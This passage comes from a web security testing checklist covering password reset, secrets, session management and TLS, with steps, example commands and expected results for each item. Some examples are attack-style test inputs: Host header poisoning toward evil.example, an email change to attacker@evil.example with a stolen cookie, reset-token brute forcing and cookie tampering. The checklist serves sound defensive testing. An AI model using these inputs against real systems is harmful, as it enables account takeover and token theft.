  *Example:* `for i in 1 2 3 4 5; do curl -s -d "email=u$i@test.example" https://target/invite; done ; then compare the mails in the mail catcher.`  
  *Expected:* Initial secrets are random, follow the password policy, and expire quickly or after first use. The user must set a new password.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-02; asvs: V6.4.1; cheatsheet: Authentication_Cheat_Sheet, Forgot_Password_Cheat_Sheet; cwe: CWE-330, CWE-338, CWE-1393, CWE-521

- [ ] **WEB-PWD-017** Check that password reset gives no account enumeration  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds different messages or times for known and unknown accounts in the reset form.  
  *Steps:*
  1. Request a reset for a known email address. Save message, status, length and time.
  2. Request a reset for an unknown address. Compare all values.
  3. Send 20 requests for each case and compare the average time.
  4. Repeat on the SMS or phone reset path.
  *Example:* `for u in known@test.example nobody@test.example; do curl -s -o /dev/null -w "$u %{http_code} %{size_download} %{time_total}\n" -d "email=$u" https://target/forgot; done`  
  *Expected:* The response is the same for known and unknown accounts, in message, status and time.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-09; asvs: V6.3.8; cheatsheet: Forgot_Password_Cheat_Sheet, Authentication_Cheat_Sheet; cwe: CWE-204, CWE-208; capec: CAPEC-50

- [ ] **WEB-PWD-018** Check the reset token: randomness, life, single use and storage  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds reset tokens that are guessable, reusable, long lived or stored in plain text.  
  *Steps:*
  1. Request five reset links. Examine the tokens for patterns and length.
  2. Use a token once and then again.
  3. Wait for the lifetime to pass. Use the token.
  4. Request a new token. Check that the old token stops working.
  5. Read the code or database for plain-text token storage.
  6. Send many token guesses and look for a rate limit.
  *Example:* `Burp Sequencer on the token from the reset mail; ffuf -w tokens.txt -u 'https://target/reset?token=FUZZ' -mc 200`  
  *Expected:* Tokens are random and long, single use, and short lived. A new request cancels the old token. The server stores only hashes and rate limits guesses.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-09; cheatsheet: Forgot_Password_Cheat_Sheet; cwe: CWE-640, CWE-330, CWE-331, CWE-620; capec: CAPEC-50

- [ ] **WEB-PWD-019** Test reset link for Host header injection and token leak  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds reset links built from the Host header and tokens that leak by Referer.  
  *Steps:*
  1. Send the reset request with a changed Host or X-Forwarded-Host header.
  2. Read the link in the mail.
  3. Open the reset link and look at requests to other domains.
  4. Look for the token in the Referer header and for a Referrer-Policy header.
  5. Change a user ID parameter in the reset link.
  *Example:* `curl -i https://target/forgot -H 'Host: evil.example' -H 'X-Forwarded-Host: evil.example' -d 'email=victim@test.example'`  
  *Expected:* Reset links use a fixed trusted host and HTTPS. The reset page sends no token to third parties and sets Referrer-Policy. The token alone selects the user.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-09; cheatsheet: Forgot_Password_Cheat_Sheet; cwe: CWE-640, CWE-200, CWE-598; capec: CAPEC-50

- [ ] **WEB-PWD-020** Check what happens after a password reset  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds resets that leave old sessions alive, log the user in, or send the password.  
  *Steps:*
  1. Log in on two browsers with the same account.
  2. Reset the password in one browser.
  3. Check if the other session still works.
  4. Look at the reset mail and the response for the new password.
  5. Check that the user must log in with the new password.
  *Example:* `Browser A: reset flow. Browser B: curl -b 'session=<old>' https://target/account -i`  
  *Expected:* The reset does not send the password or log in the user. The user gets a notice and old sessions end or can be ended.  
  *Refs:* wstg: WSTG-ATHN-09; cheatsheet: Forgot_Password_Cheat_Sheet; cwe: CWE-620, CWE-384

- [ ] **WEB-PWD-021** Check that admins cannot set a user password  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds admin functions that let staff choose or learn a user password.  
  *Steps:*
  1. Log in as administrator and open the user management page.
  2. Find the reset function for a user.
  3. Check if the administrator can type the new password.
  4. Check that the function only starts the reset flow for the user.
  *Example:* `Burp: POST /admin/users/42/reset with a 'password' parameter added; watch if the value is accepted.`  
  *Expected:* Administrators can start a reset for the user but cannot set or see the password.  
  *Refs:* asvs: V6.4.6; cheatsheet: Forgot_Password_Cheat_Sheet; cwe: CWE-620, CWE-269

- [ ] **WEB-PWD-022** Check reminders before authentication factors expire  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L3  
  *Objective:* Finds expiring credentials, certificates or tokens with no reminder.  
  *Steps:*
  1. List the factors that expire: passwords, certificates, tokens.
  2. Read the reminder rules.
  3. Create a test factor that is near expiry.
  4. Check that the user gets reminders in time to renew.
  *Example:* `Set the certificate notAfter to 7 days from now on a test user; read the mail catcher the next day.`  
  *Expected:* Users get automatic reminders early enough to renew a factor before it expires.  
  *Refs:* asvs: V6.4.5; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-324


## SECRET

- [ ] **WEB-SECRET-001** Make sure a secrets management solution stores backend secrets with least privilege  
  *Severity if fail:* High | *Type:* Config Review, Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find secrets in code, files or environment variables and secret stores with wide access.  
  *Steps:*
  1. Ask which solution stores passwords, API keys, key material and tokens (a key vault).
  2. Search the code, images, CI variables and environment for plain-text secrets.
  3. Review the access policy of the vault for each secret and role.
  4. Check that secrets are created, accessed and destroyed through the vault and logged.
  *Example:* `trufflehog filesystem . ; docker history --no-trunc app:latest | grep -iE 'password|secret|key'; vault policy read app-policy`  
  *Expected:* A vault holds all backend secrets. Access is least-privilege, logged, and no plain-text secret exists in code or images.  
  *Refs:* cheatsheet: Secrets_Management_Cheat_Sheet; asvs: V13.3.1, V13.3.2; owasp_top10: A02:2025; cwe: CWE-798, CWE-260, CWE-526, CWE-13

- [ ] **WEB-SECRET-002** Review the list of critical secrets and the rotation schedule  
  *Severity if fail:* Medium | *Type:* Manual, Config Review | *Level:* ASVS L3  
  *Objective:* Find secrets with no rotation plan, no expiry or old age.  
  *Steps:*
  1. Ask for the document that lists the critical secrets and their rotation schedule.
  2. Check the age of each secret in the vault or key store.
  3. Check that the secrets expire and rotate on the documented schedule.
  4. Do a test rotation of one secret and check that the application keeps working.
  *Example:* `vault read -format=json secret/metadata/app | jq .data.created_time; aws secretsmanager describe-secret --secret-id app/db | jq .LastRotatedDate`  
  *Expected:* Critical secrets are documented, have an expiry, and rotate on the schedule without downtime.  
  *Refs:* cheatsheet: Secrets_Management_Cheat_Sheet; asvs: V13.1.4, V13.3.4; owasp_top10: A04:2025; cwe: CWE-324

- [ ] **WEB-SECRET-003** Check that cryptographic operations run in an isolated security module  
  *Severity if fail:* Low | *Type:* Config Review, Manual | *Level:* ASVS L3  
  *Objective:* Find private keys that application memory or the file system can read.  
  *Steps:*
  1. Ask which operations use a vault, HSM or cloud KMS.
  2. Check that key material is not exported out of the module.
  3. Try to read key files or memory of the application in a test system.
  4. Check key access policy and audit logs of the module.
  *Example:* `aws kms describe-key --key-id alias/app; pkcs11-tool --list-objects; check for exportable flag`  
  *Expected:* Key material stays in the security module. The application sends data to the module for each operation.  
  *Refs:* cheatsheet: Secrets_Management_Cheat_Sheet; asvs: V13.3.3; owasp_top10: A04:2025; cwe: CWE-321


## SESS

- [ ] **WEB-SESS-001** Read the documentation of timeouts and re-authentication  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds missing or unjustified session timeout rules.  
  *Steps:*
  1. Get the session documentation.
  2. Find the idle timeout and the absolute session lifetime.
  3. Make sure the document explains why the values fit the risk.
  4. Make sure it explains any difference from NIST SP 800-63B re-authentication rules.
  *Example:* `Compare the documented values with the framework setting, for example server.servlet.session.timeout or SESSION_COOKIE_AGE.`  
  *Expected:* The idle timeout and the absolute lifetime are documented with a reason that fits the risk and with any deviation explained.  
  *Refs:* asvs: V7.1.1; cheatsheet: Session_Management_Cheat_Sheet

- [ ] **WEB-SESS-002** Read the documentation of concurrent sessions  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds missing rules for the number of parallel sessions.  
  *Steps:*
  1. Get the session documentation.
  2. Find the maximum number of sessions for one account.
  3. Find what happens when the maximum is reached.
  4. Compare with the real behavior.
  *Example:* `Log in 10 times with curl -c jar<N>.txt and compare to the documented limit.`  
  *Expected:* The maximum number of sessions and the action at the limit are documented and match the behavior.  
  *Refs:* wstg: WSTG-SESS-11; asvs: V7.1.2; cheatsheet: Session_Management_Cheat_Sheet

- [ ] **WEB-SESS-003** Read the documentation of federated session control  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds missing rules for session lifetime and logout between SSO systems.  
  *Steps:*
  1. List all systems that create sessions in the SSO setup.
  2. Get the documentation of how lifetimes and logout are linked.
  3. Make sure it names the events that need re-authentication.
  *Example:* `Review IdP and SP configuration: session lifetime, SLO endpoints and back-channel logout URLs.`  
  *Expected:* All session-creating systems are documented with the way they coordinate lifetime, logout and re-authentication.  
  *Refs:* wstg: WSTG-SESS-06; asvs: V7.1.3; cheatsheet: Session_Management_Cheat_Sheet

- [ ] **WEB-SESS-004** Check that a trusted back end validates session tokens  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds session checks done only in the client.  
  *Steps:*
  1. Find where the application checks the session token.
  2. Change or remove client-side checks with a proxy.
  3. Send a request with a forged or empty token to a protected endpoint.
  *Example:* `curl -i -H 'Authorization: Bearer forged' https://target/api/me ; curl -i https://target/api/me`  
  *Expected:* A trusted back-end service validates every session token. Client-side checks are not relied upon.  
  *Refs:* asvs: V7.2.1; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-602, CWE-603, CWE-287

- [ ] **WEB-SESS-005** Check that sessions use generated tokens and not static keys  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds static API keys or shared secrets used as session identifiers.  
  *Steps:*
  1. Log in twice with the same account.
  2. Compare the session tokens.
  3. Look for long-lived values in the requests that never change.
  4. Check that the token changes at each login.
  *Example:* `Burp Comparer on two login responses; grep -i 'api[_-]key' in the page source.`  
  *Expected:* Each session has a new dynamically generated token. No static secret acts as a session token.  
  *Refs:* asvs: V7.2.2; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-798, CWE-330

- [ ] **WEB-SESS-006** Check session ID strength and randomness  
  *Severity if fail:* High | *Type:* Automated | *Level:* ASVS L1  
  *Objective:* Finds predictable or short session IDs.  
  *Steps:*
  1. Collect 5000 session IDs with new sessions.
  2. Decode the IDs and look for user data, time or counters.
  3. Run an entropy analysis.
  4. Check the length: at least 128 bits of entropy for reference tokens.
  5. Change a few characters of a valid ID and test it.
  *Example:* `Burp Sequencer: live capture of Set-Cookie JSESSIONID, 5000 samples, then FIPS tests.`  
  *Expected:* Session IDs are unique, come from a CSPRNG, have at least 128 bits of entropy, and hold no meaning.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-01, WSTG-ATHN-04; asvs: V7.2.3; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-330, CWE-331, CWE-338, CWE-340; capec: CAPEC-59, CAPEC-60

- [ ] **WEB-SESS-007** Check the cookie structure and manipulation of session data  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds cookies that hold readable or editable data such as roles and user names.  
  *Steps:*
  1. Collect all cookies and map each to its function.
  2. Decode each value: Base64, hex, URL and hash forms.
  3. Change non-signed values, such as IsAdmin=No, and send the request.
  4. Send unusual characters and a very long cookie.
  5. Make sure the cookie name does not show the framework.
  *Example:* `echo '<cookie>' | base64 -d ; Burp Repeater: Cookie: IsAdmin=Yes`  
  *Expected:* Cookies hold no sensitive data in clear text. Changed values are rejected. Cookie names do not reveal the technology.  
  *Refs:* wstg: WSTG-SESS-01; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-565, CWE-472; capec: CAPEC-39, CAPEC-31, CAPEC-226

- [ ] **WEB-SESS-008** Check the Secure and HttpOnly cookie attributes  
  *Severity if fail:* Medium | *Type:* Automated  
  *Objective:* Finds session cookies that travel over HTTP or that scripts can read.  
  *Steps:*
  1. List all Set-Cookie headers after login.
  2. Make sure each session cookie has Secure and HttpOnly.
  3. Request the HTTP version of the site and look for the cookie.
  4. Read document.cookie in the console.
  *Example:* `curl -skI https://target/login -d 'u=t&p=t' | grep -i set-cookie ; ZAP passive scan: Cookie without Secure/HttpOnly`  
  *Expected:* Session cookies have Secure and HttpOnly. They are never sent over HTTP and are not in document.cookie.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-02; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-614, CWE-1004; capec: CAPEC-31

- [ ] **WEB-SESS-009** Check the SameSite attribute and cookie prefixes  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds missing SameSite and __Host- protection on session cookies.  
  *Steps:*
  1. Look at the SameSite value of each session cookie.
  2. Check the prefix: __Host- is best, __Secure- if subdomains share cookies.
  3. Try to set a cookie with the same name from a subdomain.
  4. Check the browser behavior with the attribute missing.
  *Example:* `Expected header: Set-Cookie: __Host-SID=<token>; Path=/; Secure; HttpOnly; SameSite=Strict`  
  *Expected:* Session cookies use SameSite=Lax or Strict and the __Host- prefix when possible. A subdomain cannot overwrite them.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-SESS-02; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-1275, CWE-565

- [ ] **WEB-SESS-010** Check the Domain, Path and Expires scope of session cookies  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds cookies shared with other apps or subdomains, and persistent session cookies.  
  *Steps:*
  1. Read the Domain and Path attributes of the session cookie.
  2. Check that Domain is not set, or is as narrow as possible.
  3. List other apps on the same domain that can read the cookie.
  4. Check Expires and Max-Age. A session cookie must not be persistent.
  5. Close the browser and open it again.
  *Example:* `curl -sI https://target/login -d 'u=t&p=t' | grep -i 'domain=\|expires\|max-age'`  
  *Expected:* Session cookies have a narrow scope and no persistent expiry. Other apps and subdomains do not get them.  
  *Refs:* wstg: WSTG-SESS-02, WSTG-SESS-01; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-1004, CWE-614

- [ ] **WEB-SESS-011** Check that the session ID changes at login and privilege change  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds session fixation, where an attacker sets the session ID before login.  
  *Steps:*
  1. Open the login page and save the session cookie.
  2. Log in and look at the cookie after login.
  3. Send the old cookie value after login.
  4. Set a chosen cookie value with a proxy and log in.
  5. Repeat after re-authentication and after a role change.
  *Example:* `curl -sc a.txt https://target/login >/dev/null; curl -b a.txt -c b.txt -d 'u=t&p=t' https://target/login; diff a.txt b.txt`  
  *Expected:* The application issues a new token at each login and re-authentication. The old token ends. It does not accept a session ID that the client chose.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-03; asvs: V7.2.4; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-384; capec: CAPEC-61

- [ ] **WEB-SESS-012** Check that session IDs are not in URLs  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds session IDs in URLs, hidden fields or accepted from unplanned places.  
  *Steps:*
  1. Examine all links and forms for session IDs in the URL.
  2. Send the session ID in a URL parameter instead of the cookie.
  3. Send a POST login as a GET request.
  4. Look at the Referer header sent to other sites.
  *Example:* `curl -i 'https://target/account?JSESSIONID=<valid-id>' ; curl -i 'https://target/login?user=t&password=t'`  
  *Expected:* Session IDs travel only in cookies over HTTPS. The application ignores IDs from URLs and does not accept POST data in GET.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-04; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-598, CWE-200

- [ ] **WEB-SESS-013** Check session cookie exposure to network attackers and HSTS  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds session cookies that leak in clear text, also to subdomains.  
  *Steps:*
  1. Log in as the victim. Remove the cookies that have Secure from the jar.
  2. Send the secure function again with the remaining cookies.
  3. Check Strict-Transport-Security with includeSubDomains.
  4. Check if a subdomain can read cookies with a Domain attribute.
  *Example:* `curl -sI https://target | grep -i strict-transport ; mitmproxy listen on :80 and redirect victim browser to http://sub.target`  
  *Expected:* Session cookies are not sent over HTTP. HSTS covers the apex domain and all subdomains.  
  *Refs:* wstg: WSTG-SESS-09, WSTG-SESS-04; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-319, CWE-614; capec: CAPEC-102, CAPEC-593

- [ ] **WEB-SESS-014** Check cache headers on responses with session data  
  *Severity if fail:* Low | *Type:* Automated  
  *Objective:* Finds responses with session IDs that proxies or the browser may store.  
  *Steps:*
  1. Collect responses that set or carry session IDs.
  2. Look at the Cache-Control header.
  3. Look for the same headers in HTTP/1.0 clients.
  4. Check that Clear-Site-Data is sent at logout.
  *Example:* `curl -sI -b 'session=<id>' https://target/account | grep -i 'cache-control\|pragma\|clear-site-data'`  
  *Expected:* Responses with session data have Cache-Control: no-store. Logout can clear stored data.  
  *Refs:* wstg: WSTG-SESS-04; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-525, CWE-524

- [ ] **WEB-SESS-015** Test session puzzling and session variable overload  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds session variables used for more than one purpose, which skips steps in a flow.  
  *Steps:*
  1. Map the session variables set by public pages such as password recovery.
  2. Call a recovery entry point that sets a user name in the session.
  3. Request a protected page directly.
  4. Skip steps of multi-step flows.
  *Example:* `Burp: GET /forgot?user=admin (do not finish), then GET /admin/dashboard with the same cookie.`  
  *Expected:* Each session variable has one purpose. Pages cannot be reached by setting variables in another flow.  
  *Refs:* wstg: WSTG-SESS-08; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-841, CWE-288, CWE-304

- [ ] **WEB-SESS-016** Check the logout button on all pages  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds pages without a visible logout function.  
  *Steps:*
  1. Open every authenticated page type.
  2. Look for the logout button without scrolling.
  3. Check that it is in the same place on all pages.
  *Example:* `Crawl with ZAP spider and compare each page for a /logout link: grep -L logout *.html`  
  *Expected:* A logout function is visible and easy to find on all authenticated pages.  
  *Refs:* wstg: WSTG-SESS-06; asvs: V7.4.4; cheatsheet: Session_Management_Cheat_Sheet

- [ ] **WEB-SESS-017** Check server-side session termination at logout  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds sessions that stay valid after logout.  
  *Steps:*
  1. Save the session cookie. Log out.
  2. Send a request with the old cookie to a protected page.
  3. Use the Back button and look for private data.
  4. For self-contained tokens, send the old token after logout.
  *Example:* `curl -i -b 'session=<old>' https://target/account after GET /logout.`  
  *Expected:* After logout the session is ended on the server. Old reference tokens and self-contained tokens are rejected.  
  *Refs:* owasp_top10: A07:2025, A01:2025; wstg: WSTG-SESS-06; asvs: V7.4.1; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-287, CWE-384

- [ ] **WEB-SESS-018** Check single sign-off and reuse of the auth cookie across devices  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds SSO setups where logout does not end all sessions or one stolen value works anywhere.  
  *Steps:*
  1. Log in on device 1 with MFA. Save all auth values.
  2. Remove each value in turn and find the one that keeps the session alive.
  3. Insert that value on device 2.
  4. Log out on device 1. Use the value on device 2 and on other SSO apps.
  *Example:* `Browser DevTools: copy auth-cookie from device 1, paste on device 2, then call GET /api/me on each SSO app.`  
  *Expected:* Logout ends the session on all apps. The auth value works only for the device and cannot be copied to skip MFA.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-06; asvs: V7.6.1; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-384, CWE-294

- [ ] **WEB-SESS-019** Test the idle timeout  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds missing or client-only idle timeouts.  
  *Steps:*
  1. Log in and note the time.
  2. Send requests with longer waits: 5, 15 and 30 minutes.
  3. Find the time when the server rejects the session.
  4. Change client-side timestamps and cookie expiry values.
  5. Replay the old session ID after the timeout.
  *Example:* `while sleep 300; do curl -s -o /dev/null -w '%{http_code}\n' -b 'session=<id>' https://target/account; done`  
  *Expected:* The server ends the session after the documented inactivity time and rejects the old ID. Client values do not extend it.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-07; asvs: V7.3.1; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-287

- [ ] **WEB-SESS-020** Test the absolute session lifetime  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds sessions that live forever when the user stays active.  
  *Steps:*
  1. Log in and note the time.
  2. Send a request every minute for the test window.
  3. Check that the application asks for login at the documented limit.
  4. Replay the old session ID.
  *Example:* `while sleep 60; do curl -s -o /dev/null -w '%{http_code} ' -b 'session=<id>' https://target/account; done`  
  *Expected:* The session ends at the absolute limit even with activity. Renewing the ID does not reset the limit.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-SESS-07; asvs: V7.3.2; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-287

- [ ] **WEB-SESS-021** Check that disabling an account ends its sessions  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds active sessions that survive when an account is disabled or deleted.  
  *Steps:*
  1. Log in as a test user and keep the session cookie.
  2. As administrator, disable the user, then delete another test user the same way.
  3. Send requests with the saved cookies.
  4. Test API tokens and refresh tokens too.
  *Example:* `curl -i -b 'session=<user>' https://target/api/me after PATCH /admin/users/42 {"active":false}`  
  *Expected:* All sessions and tokens of a disabled or deleted account stop working at once.  
  *Refs:* owasp_top10: A01:2025; asvs: V7.4.2; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-287

- [ ] **WEB-SESS-022** Check the option to end other sessions after a factor change  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds password or MFA changes that leave other sessions open.  
  *Steps:*
  1. Log in on two browsers.
  2. Change the password or MFA setting on browser 1.
  3. Look for an option to end other sessions.
  4. Test the session of browser 2.
  *Example:* `Browser 2: curl -b 'session=<old>' https://target/account after the change in browser 1.`  
  *Expected:* After a change of any authentication factor the user can end all other sessions. Reset and recovery do the same.  
  *Refs:* asvs: V7.4.3; cheatsheet: Session_Management_Cheat_Sheet, Forgot_Password_Cheat_Sheet; cwe: CWE-384

- [ ] **WEB-SESS-023** Check that administrators can end user sessions  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds missing admin control to end sessions of one or all users.  
  *Steps:*
  1. Log in as administrator.
  2. End the sessions of one user. Test that user's cookie.
  3. End all sessions. Test several cookies.
  4. Check that a normal user cannot call these functions.
  *Example:* `curl -X POST https://target/admin/sessions/revoke -b 'session=<admin>' -d 'user=42'`  
  *Expected:* Administrators can end the sessions of one user or all users, and the effect is immediate. Other roles cannot.  
  *Refs:* asvs: V7.4.5; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-862

- [ ] **WEB-SESS-024** Check that users can see and end their active sessions  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds no session list, or ending sessions without re-authentication.  
  *Steps:*
  1. Log in on two browsers.
  2. Open the active session list.
  3. End one session and check it stops.
  4. Check that the action asks for a factor again.
  *Example:* `GET /account/sessions then DELETE /account/sessions/<id> with and without a fresh login.`  
  *Expected:* Users can see all active sessions and end any of them after they authenticate again with at least one factor.  
  *Refs:* wstg: WSTG-SESS-11; asvs: V7.5.2; cheatsheet: Session_Management_Cheat_Sheet

- [ ] **WEB-SESS-025** Check re-authentication before changes to account recovery data  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds changes of email, phone or MFA that need only the session cookie.  
  *Steps:*
  1. Log in. Change the email address.
  2. Check if the password or MFA is asked.
  3. Repeat for phone number, MFA settings and recovery data.
  4. Send the change request from a stolen cookie in another browser.
  *Example:* `curl -i -b 'session=<stolen>' -d 'email=attacker@evil.example' https://target/account/email`  
  *Expected:* Changes to email, phone, MFA and recovery data need full re-authentication. Notices go to the old address.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-09; asvs: V7.5.1; cheatsheet: Authentication_Cheat_Sheet, Session_Management_Cheat_Sheet; cwe: CWE-620

- [ ] **WEB-SESS-026** Check step-up authentication for highly sensitive operations  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds high-value operations that need no extra proof.  
  *Steps:*
  1. List the most sensitive actions: payments, admin changes, key export.
  2. Run each action with a normal session.
  3. Check for a second factor or secondary check.
  4. Replay the confirmed request: it must not work a second time.
  *Example:* `Burp Repeater: replay POST /transfer confirm=<otp> twice and change the amount between steps.`  
  *Expected:* Highly sensitive actions need a second check each time. The approval is bound to the shown data and works once.  
  *Refs:* asvs: V7.5.3; cheatsheet: Transaction_Authorization_Cheat_Sheet, Authentication_Cheat_Sheet; cwe: CWE-308, CWE-294

- [ ] **WEB-SESS-027** Check that a session needs user consent or action  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds sessions that start with no user action.  
  *Steps:*
  1. Open a link to the application while the IdP session is active.
  2. Check if the application creates a session without a click.
  3. Open the application from a cross-site link and look at the result.
  *Example:* `Open https://target/sso/start in a fresh tab from a cross-site page and watch for Set-Cookie without a click.`  
  *Expected:* Sessions start only after a user action or consent. No silent session creation exists.  
  *Refs:* asvs: V7.6.2; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-352

- [ ] **WEB-SESS-028** Test concurrent sessions and session limits  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds unlimited parallel sessions or old sessions that stay valid.  
  *Steps:*
  1. Log in 100 times with one account and save each cookie.
  2. Test the first cookie.
  3. Log in from different IP addresses and places.
  4. Compare the result with the documented limit.
  *Example:* `for i in $(seq 100); do curl -s -c j$i.txt -d 'u=t&p=t' https://target/login -o /dev/null; done; curl -b j1.txt https://target/account -i`  
  *Expected:* The application limits active sessions as documented and ends older sessions at the limit. Unusual logins cause a notice.  
  *Refs:* wstg: WSTG-SESS-11; asvs: V7.1.2; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-770

- [ ] **WEB-SESS-029** Check where the client stores session tokens  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds tokens in localStorage or sessionStorage, which scripts can read.  
  *Steps:*
  1. Log in and open DevTools > Application.
  2. Look in localStorage, sessionStorage and IndexedDB for tokens.
  3. Check for tokens in the page source.
  4. Check if XSS could read them.
  *Example:* `DevTools console: Object.entries(localStorage).concat(Object.entries(sessionStorage))`  
  *Expected:* Session tokens are not stored in localStorage or sessionStorage. They are in cookies with HttpOnly.  
  *Refs:* wstg: WSTG-SESS-10; cheatsheet: Session_Management_Cheat_Sheet; cwe: CWE-922, CWE-1004

- [ ] **WEB-SESS-030** Test state-changing requests for cross-site request forgery  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds actions that a third-party page can trigger with the victim session cookie.  
  *Steps:*
  1. List the state-changing requests that rely only on cookies.
  2. Check the SameSite attribute of the session cookie.
  3. Replay a request without the anti-CSRF token and with a token of another user.
  4. Build a test page that sends the request from another site, in a test environment.
  5. Test JSON endpoints with a form content type.
  *Example:* `ZAP: Generate Anti-CSRF Test Form on the request, host it on a second origin and open it in the victim session.`  
  *Expected:* State-changing requests fail without a valid anti-CSRF token. The request origin and cookie attributes add defense.  
  *Refs:* wstg: WSTG-SESS-05; cwe: CWE-352; capec: CAPEC-62


## TLS

- [ ] **WEB-TLS-001** Make sure only TLS 1.2 and TLS 1.3 are enabled  
  *Severity if fail:* Medium | *Type:* Automated, Config Review | *Level:* ASVS L1  
  *Objective:* Find old protocol versions (SSLv3, TLS 1.0, TLS 1.1) or weak settings such as compression.  
  *Steps:*
  1. Scan the HTTPS port with testssl.sh or sslscan.
  2. Make sure SSLv2, SSLv3, TLS 1.0 and TLS 1.1 are off.
  3. Make sure TLS 1.3 is available and preferred.
  4. Make sure TLS compression is off.
  5. Repeat on every other TLS port that the application uses.
  *Example:* `testssl.sh --protocols --vulnerable example.com:443; nmap --script ssl-enum-ciphers -p443 example.com`  
  *Expected:* Only TLS 1.2 and TLS 1.3 are enabled, with the latest version preferred. Compression is off and no known TLS attack applies.  
  *Refs:* wstg: WSTG-CRYP-01; asvs: V12.1.1; owasp_top10: A04:2025; cheatsheet: Transport_Layer_Security_Cheat_Sheet; cwe: CWE-326, CWE-327, CWE-757; capec: CAPEC-217

- [ ] **WEB-TLS-002** Make sure only strong cipher suites with forward secrecy are enabled  
  *Severity if fail:* Medium | *Type:* Automated, Config Review | *Level:* ASVS L2  
  *Objective:* Find weak cipher suites, such as NULL, anonymous, EXPORT, RSA key transport and CBC, and weak key exchange groups.  
  *Steps:*
  1. List all cipher suites that the server accepts for each protocol version.
  2. Make sure NULL, anonymous, EXPORT and RC4 and 3DES suites are off.
  3. Make sure TLS 1.2 uses ECDHE with AEAD suites and the server order puts the strongest first.
  4. Make sure RSA key transport and static DH suites are off. They have no forward secrecy.
  5. Check the Diffie-Hellman groups and look for ffdhe2048 or larger, x25519 or secp256r1.
  *Example:* `testssl.sh -E example.com:443; sslyze --regular example.com; Mozilla SSL config generator https://ssl-config.mozilla.org/`  
  *Expected:* Only AEAD cipher suites with forward secrecy are accepted, strongest first. No NULL, anonymous, EXPORT or RSA key transport suite exists.  
